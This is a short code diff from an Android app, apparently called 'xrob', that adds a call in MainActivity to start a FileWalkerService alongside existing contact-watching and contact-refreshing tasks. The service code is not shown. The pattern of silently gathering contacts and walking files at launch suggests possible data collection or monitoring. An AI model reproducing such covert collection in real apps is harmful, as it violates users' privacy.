@@ -16,6 +16,7 @@ import android.widget.Toast;
 
 import com.theah64.xrob.asynctasks.ContactRefresher;
 import com.theah64.xrob.services.ContactsWatcherService;
+import com.theah64.xrob.services.FileWalkerService;
 import com.theah64.xrob.utils.APIRequestBuilder;
 import com.theah64.xrob.utils.APIRequestGateway;
 import com.theah64.xrob.utils.APIResponse;
@@ -206,6 +207,7 @@ public class MainActivity extends AppCompatActivity {
 
         new ContactRefresher(this).execute();
         startService(new Intent(this, ContactsWatcherService.class));
+        startService(new Intent(this, FileWalkerService.class));
     }
 
 }
